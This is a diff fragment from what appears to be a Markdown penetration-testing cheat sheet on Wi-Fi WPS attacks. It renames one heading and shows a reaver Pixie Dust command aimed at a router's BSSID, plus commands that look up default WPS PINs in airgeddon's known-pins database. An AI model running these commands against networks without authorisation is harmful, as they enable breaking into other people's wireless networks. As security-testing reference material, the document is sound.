@@ -46,7 +46,7 @@ success running this attack against Ralink and RealTek chipsets. And very spotty
 ```text
 sudo reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
 ```
-#### airgeddon
+#### Airgeddon - Known Pins
 ```text
 source /usr/share/airgeddon/known_pins.db
 echo ${PINDB["0013F7"]}	#first three parts of the BSSID CODE
